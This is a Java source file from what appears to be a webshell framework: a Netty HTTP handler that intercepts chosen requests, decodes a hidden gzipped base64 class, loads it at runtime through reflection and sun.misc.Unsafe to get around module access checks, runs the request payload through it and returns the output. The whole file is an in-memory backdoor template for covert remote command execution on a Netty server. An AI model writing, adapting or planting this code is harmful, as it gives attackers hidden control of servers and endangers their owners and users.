package com.reajason.noone.core.shelltool;


import io.netty.buffer.CompositeByteBuf;
import io.netty.buffer.Unpooled;
import io.netty.channel.ChannelDuplexHandler;
import io.netty.channel.ChannelFutureListener;
import io.netty.channel.ChannelHandler;
import io.netty.channel.ChannelHandlerContext;
import io.netty.handler.codec.http.*;
import io.netty.util.ReferenceCountUtil;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.net.URL;
import java.net.URLClassLoader;
import java.util.zip.GZIPInputStream;

@ChannelHandler.Sharable
public class NoOneNettyHandler extends ChannelDuplexHandler {
    private static String coreGzipBase64;
    private boolean authed;
    private Class<?> coreClass;
    private CompositeByteBuf accumulated;

    @Override
    public void channelRead(ChannelHandlerContext ctx, Object msg) throws Exception {
        if (msg instanceof HttpRequest) {
            authed = isAuthed((HttpRequest) msg);
            if (!authed) {
                ctx.fireChannelRead(msg);
                return;
            }
            ReferenceCountUtil.release(msg);
            return;
        }
        if (msg instanceof HttpContent) {
            if (!authed) {
                ctx.fireChannelRead(msg);
                return;
            }
            HttpContent httpContent = (HttpContent) msg;
            if (accumulated == null) {
                accumulated = ctx.alloc().compositeBuffer();
            }
            accumulated.addComponent(true, httpContent.content().retain());

            if (httpContent instanceof LastHttpContent) {
                try {
                    byte[] bytes = new byte[accumulated.readableBytes()];
                    accumulated.getBytes(accumulated.readerIndex(), bytes);
                    byte[] payload = transformReqPayload(getArgFromContent(bytes));
                    if (coreClass == null) {
                        byte[] coreBytes = gzipDecompress(decodeBase64(coreGzipBase64));
                        coreClass = reflectionDefineClass(coreBytes);
                    }
                    ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
                    Object httpChannelCore = coreClass.getConstructor(Object.class).newInstance(this);
                    httpChannelCore.equals(new Object[]{payload, outputStream});
                    httpChannelCore.toString();
                    byte[] data = wrapResData(transformResData(outputStream.toByteArray()));
                    FullHttpResponse response = new DefaultFullHttpResponse(
                            HttpVersion.HTTP_1_1,
                            HttpResponseStatus.OK,
                            Unpooled.wrappedBuffer(data)
                    );
                    wrapResponse(response);
                    ctx.writeAndFlush(response).addListener(ChannelFutureListener.CLOSE_ON_FAILURE);
                } finally {
                    accumulated.release();
                    accumulated = null;
                    authed = false;
                    ReferenceCountUtil.release(msg);
                }
                return;
            } else {
                ReferenceCountUtil.release(msg);
                return;
            }
        }
        ctx.fireChannelRead(msg);
    }

    @Override
    public void channelInactive(ChannelHandlerContext ctx) throws Exception {
        if (accumulated != null) {
            accumulated.release();
            accumulated = null;
            authed = false;
        }
        super.channelInactive(ctx);
    }

    private boolean isAuthed(HttpRequest request) {
        return true;
    }

    private byte[] getArgFromContent(byte[] content) {
        return null;
    }

    private byte[] transformReqPayload(byte[] input) {
        return input;
    }

    private byte[] wrapResData(byte[] payload) {
        return payload;
    }

    private byte[] transformResData(byte[] payload) {
        return payload;
    }

    private void wrapResponse(FullHttpResponse response) {
    }

    @SuppressWarnings("all")
    public Class<?> reflectionDefineClass(byte[] classBytes) throws Exception {
        Object unsafe = null;
        Object rawModule = null;
        long offset = 48;
        Method getAndSetObjectM = null;
        try {
            Class<?> unsafeClass = Class.forName("sun.misc.Unsafe");
            Field unsafeField = unsafeClass.getDeclaredField("theUnsafe");
            unsafeField.setAccessible(true);
            unsafe = unsafeField.get(null);
            rawModule = Class.class.getMethod("getModule").invoke(this.getClass(), (Object[]) null);
            Object module = Class.class.getMethod("getModule").invoke(Object.class, (Object[]) null);
            Method objectFieldOffsetM = unsafe.getClass().getMethod("objectFieldOffset", Field.class);
            offset = (Long) objectFieldOffsetM.invoke(unsafe, Class.class.getDeclaredField("module"));
            getAndSetObjectM = unsafe.getClass().getMethod("getAndSetObject", Object.class, long.class, Object.class);
            getAndSetObjectM.invoke(unsafe, this.getClass(), offset, module);
        } catch (Throwable ignored) {
        }
        URLClassLoader urlClassLoader = new URLClassLoader(new URL[0], Thread.currentThread().getContextClassLoader());
        Method defMethod = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, Integer.TYPE, Integer.TYPE);
        defMethod.setAccessible(true);
        Class<?> clazz = (Class<?>) defMethod.invoke(urlClassLoader, classBytes, 0, classBytes.length);
        if (getAndSetObjectM != null) {
            getAndSetObjectM.invoke(unsafe, this.getClass(), offset, rawModule);
        }
        return clazz;
    }

    @SuppressWarnings("all")
    public static byte[] decodeBase64(String base64Str) throws Exception {
        Class<?> decoderClass;
        try {
            decoderClass = Class.forName("java.util.Base64");
            Object decoder = decoderClass.getMethod("getDecoder").invoke(null);
            return (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, base64Str);
        } catch (Throwable e) {
            decoderClass = Class.forName("sun.misc.BASE64Decoder");
            return (byte[]) decoderClass.getMethod("decodeBuffer", String.class).invoke(decoderClass.newInstance(), base64Str);
        }
    }

    @SuppressWarnings("all")
    public static byte[] gzipDecompress(byte[] compressedData) throws IOException {
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        GZIPInputStream gzipInputStream = null;
        try {
            gzipInputStream = new GZIPInputStream(new ByteArrayInputStream(compressedData));
            byte[] buffer = new byte[4096];
            int n;
            while ((n = gzipInputStream.read(buffer)) > 0) {
                out.write(buffer, 0, n);
            }
            return out.toByteArray();
        } finally {
            if (gzipInputStream != null) {
                gzipInputStream.close();
            }
            out.close();
        }
    }
}
